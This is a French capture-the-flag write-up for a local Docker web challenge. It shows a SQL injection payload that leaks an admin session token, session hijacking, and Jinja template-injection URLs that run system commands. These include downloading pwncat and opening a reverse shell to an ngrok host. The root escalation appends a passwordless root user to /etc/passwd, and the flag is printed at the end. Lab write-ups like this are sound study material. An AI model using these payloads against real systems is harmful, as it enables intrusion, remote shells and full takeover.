Pour lancer le challenge :
```
sudo docker-compose up -d --build
```

_________________________________

Pour la première étape de résolution, après avoir fait un rapide tour du site on se rend compte qu'il y a un formulaire de connexion et un formulaire de création de compte sur "/register".
Le champs `username` de création de compte est vulnérable aux SQL Injection.

En plaçant la payload suivante, et en créant un compte en suivant les restrictions d'usage, après validation le token de session du compte administrateur devrait apparaitre sur la page :
```
test' AND 1=0 UNION SELECT session_token from users WHERE username='admin';--
```
# ADMIN COOKIE : "bd65600d-8669-4903-8a14-af88203add38"

# Restrictions SQLi:
# username entre 4 et 80 caractères
# caractères interdits ][_!#$%^&*()<>?/\|}{:'"

Ensuite, il est possible de se connecter au compte de l'administrateur en remplaçant notre cookie de session par le sien. (Ou en utilisant son mot de passe en fonction de la payload utilisé.)
A ce moment, une nouvelle page "/admin" apparait.
Sur cette page, un panda qui mange un bambou.
En bas de la page, ce trouve différentes "features", tels que "photo" pour allumer la caméra, "print" pour imprimer la page web, ou "date" pour avoir la date actuelle.
Ces dernières sont défini via un paramètre ***GET*** `cmd`.
En modifiant la valeur du pramètre, nous pouvons voir que le contenu est reflété sur la page. Il est alors possible d'essayer différentes payload, jusqu'à comprendre que ce dernier est vulnérable aux SSTI.

A ce stade, il est alors possible d'exécuter des commandes système sur le serveur distant.
```http
http://127.0.0.1:5000/admin?cmd={{cycler.__init__.__globals__.os.popen('ls').read()}}

ou 

http://127.0.0.1:5000/admin?cmd={{cycler.__init__.__globals__.os.popen('curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat > pwncat').read()}}
http://127.0.0.1:5000/admin?cmd={{cycler.__init__.__globals__.os.popen('chmod 777 pwncat').read()}}
http://127.0.0.1:5000/admin?cmd={{cycler.__init__.__globals__.os.popen('./pwncat -e “/bin/bash” 4.tcp.ngrok.io 19011').read()}}

```

# Restrictions SSTI:
# taille limité à 70 caractères
# caractères interdits "#&;[]|

Dans un dernier temps, une fois sur la machine, il faut réussir à faire une montée en privilège afin de devenir super utilisateur "root".
Pour cela, rien de plus simple, un fichier important du système est accessible en lecture/écriture pour tous.
Ce fichier "/etc/passwd", quand il est possible d'écrire à l'intérieur permet de rajouter un utilisateur et possiblement de lui accorder les accès root.
Avec les commandes suivantes, il est possible de créer l'utilisateur "dummy" lié au dossier "/root".
```
echo 'dummy::0:0::/root:/bin/bash' >> /etc/passwd
su - dummy
```

Alors il ne reste plus qu'à regarder dans le dossier "/root" pour pouvoir lire le FLAG du challenge :

```
IMustSayC0ngratulat1Ons?ID0ntCar3#Go3at1ngBamb00
```